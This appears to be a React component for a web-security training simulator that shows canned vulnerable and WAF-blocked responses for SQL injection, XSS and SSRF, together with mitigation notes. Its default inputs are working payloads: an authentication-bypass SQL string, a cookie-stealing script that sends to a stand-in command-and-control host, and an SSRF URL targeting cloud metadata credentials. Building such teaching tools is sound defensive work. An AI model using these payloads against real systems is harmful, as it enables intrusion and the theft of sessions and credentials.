import React, { useState } from 'react';
import { Globe, Shield, ShieldCheck, ShieldAlert, Play, Code, Lock } from 'lucide-react';

export const WebDefenseSandbox: React.FC = () => {
  const [attackType, setAttackType] = useState<'sqli' | 'xss' | 'ssrf'>('sqli');
  const [payload, setPayload] = useState("admin' OR '1'='1' --");
  const [wafProtection, setWafProtection] = useState(false);

  const getResponse = () => {
    if (wafProtection) {
      return {
        status: '403 Forbidden',
        badge: 'bg-red-500/20 text-red-400 border-red-500/40',
        content: `HTTP/1.1 403 Forbidden
Server: Cloudflare-WAF / AWS-WAF
Content-Type: application/json

{
  "error": "Request blocked by enterprise Web Application Firewall",
  "rule_triggered": "OWASP_CRS_942100_SQL_INJECTION",
  "action": "DROP_CONNECTION",
  "client_ip": "198.51.100.14"
}`,
        defenseNotes: 'WAF intercepted malicious token stream before reaching application runtime. In addition, backend uses PreparedStatement parameterized queries where untrusted data is strictly bound as string literals.'
      };
    }

    if (attackType === 'sqli') {
      return {
        status: '200 OK (Vulnerable)',
        badge: 'bg-red-500 text-white font-bold',
        content: `HTTP/1.1 200 OK
Content-Type: application/json

{
  "authenticated": true,
  "user": "administrator",
  "role": "SuperAdmin",
  "session_token": "eyJh...adm_super_token",
  "database_dump": [
    {"user": "admin", "hash": "$2a$12$e82b1..."},
    {"user": "cfo_finance", "hash": "$2a$12$98ca1..."}
  ]
}`,
        defenseNotes: 'Vulnerable query: SELECT * FROM users WHERE user = \'' + payload + '\' - String concatenation allowed the attacker to alter the query logic and bypass authentication!'
      };
    } else if (attackType === 'xss') {
      return {
        status: '200 OK (Vulnerable)',
        badge: 'bg-red-500 text-white font-bold',
        content: `HTTP/1.1 200 OK
Content-Type: text/html

<div id="search-results">
  Searched for: ${payload}
</div>
<!-- BROWSER CONSOLE: -->
> Stolen document.cookie sent to http://c2.evil-corp.top/harvest?cookie=PHPSESSID=9a8b7c6d5e4f`,
        defenseNotes: 'The input was reflected unescaped directly into the DOM. Mitigate using context-aware HTML encoding and set HttpOnly flags on session cookies!'
      };
    } else {
      return {
        status: '200 OK (Vulnerable)',
        badge: 'bg-red-500 text-white font-bold',
        content: `HTTP/1.1 200 OK
Content-Type: application/json

{
  "Code": "Success",
  "AccessKeyId": "ASIA...TEMPORARY_ROLE_KEY",
  "SecretAccessKey": "4n9V...SECRET",
  "Token": "IQoJb3JpZ2luX2VjE...",
  "Expiration": "2026-10-04T05:00:00Z"
}`,
        defenseNotes: 'Server-Side Request Forgery allowed the attacker to query the AWS link-local metadata IP (169.254.169.254) and steal temporary IAM instance profile credentials!'
      };
    }
  };

  const response = getResponse();

  return (
    <div className="bg-[#0b101b] border border-slate-800 rounded-xl overflow-hidden shadow-2xl font-sans">
      <div className="bg-[#0f172a] px-4 py-3 border-b border-slate-800 flex items-center justify-between">
        <div className="flex items-center space-x-2 text-cyan-400 font-mono text-sm font-semibold">
          <Globe className="w-4 h-4" />
          <span>OWASP Web Vulnerability & WAF Defense Simulator</span>
        </div>
        <div className="flex items-center gap-2">
          <span className="text-xs text-slate-400">Enterprise WAF:</span>
          <button
            onClick={() => setWafProtection(!wafProtection)}
            className={`px-3 py-1 text-xs rounded-full font-mono font-bold flex items-center gap-1.5 transition-colors ${
              wafProtection
                ? 'bg-emerald-500 text-black shadow-lg shadow-emerald-500/20'
                : 'bg-red-500/20 text-red-400 border border-red-500/40'
            }`}
          >
            {wafProtection ? <ShieldCheck className="w-3.5 h-3.5" /> : <ShieldAlert className="w-3.5 h-3.5" />}
            {wafProtection ? 'WAF Protected (Active)' : 'WAF Disabled (Vulnerable)'}
          </button>
        </div>
      </div>

      <div className="p-4 space-y-4">
        {/* Vulnerability Tabs */}
        <div className="flex gap-2">
          <button
            onClick={() => {
              setAttackType('sqli');
              setPayload("admin' OR '1'='1' --");
            }}
            className={`px-3 py-1.5 rounded-lg text-xs font-mono font-semibold border ${
              attackType === 'sqli' ? 'bg-cyan-500 text-black border-cyan-400' : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
            }`}
          >
            SQL Injection (SQLi)
          </button>
          <button
            onClick={() => {
              setAttackType('xss');
              setPayload("<script>fetch('http://c2.top/?c='+document.cookie)</script>");
            }}
            className={`px-3 py-1.5 rounded-lg text-xs font-mono font-semibold border ${
              attackType === 'xss' ? 'bg-cyan-500 text-black border-cyan-400' : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
            }`}
          >
            Cross-Site Scripting (XSS)
          </button>
          <button
            onClick={() => {
              setAttackType('ssrf');
              setPayload("http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role");
            }}
            className={`px-3 py-1.5 rounded-lg text-xs font-mono font-semibold border ${
              attackType === 'ssrf' ? 'bg-cyan-500 text-black border-cyan-400' : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
            }`}
          >
            Server-Side Request Forgery (SSRF)
          </button>
        </div>

        {/* Input box */}
        <div className="space-y-1.5">
          <label className="text-xs text-slate-400 font-mono">
            Attacker Payload ({attackType === 'sqli' ? 'Login username input' : attackType === 'xss' ? 'Search query parameter' : 'Avatar URL fetch parameter'}):
          </label>
          <div className="flex gap-2">
            <input
              type="text"
              value={payload}
              onChange={e => setPayload(e.target.value)}
              className="w-full bg-[#111827] text-cyan-300 font-mono text-xs px-3 py-2 rounded-lg border border-slate-700 focus:outline-none focus:border-cyan-500"
            />
          </div>
        </div>

        {/* Server Response Card */}
        <div className="bg-[#0d131f] rounded-xl border border-slate-800 p-4 space-y-3">
          <div className="flex items-center justify-between border-b border-slate-800 pb-2">
            <div className="flex items-center space-x-2 text-xs font-mono">
              <span className="text-slate-400">Server Response Status:</span>
              <span className={`px-2 py-0.5 rounded text-xs ${response.badge}`}>
                {response.status}
              </span>
            </div>
            <span className="text-[11px] font-mono text-slate-500">Latency: 18ms</span>
          </div>

          <pre className="bg-[#050811] p-3 rounded-lg font-mono text-xs text-slate-300 overflow-x-auto whitespace-pre-wrap leading-relaxed border border-slate-800">
            {response.content}
          </pre>

          <div className="p-3 rounded-lg bg-slate-900 border border-slate-800 text-xs text-slate-300">
            <strong className="text-cyan-400">Application Security Analysis: </strong>
            {response.defenseNotes}
          </div>
        </div>
      </div>
    </div>
  );
};
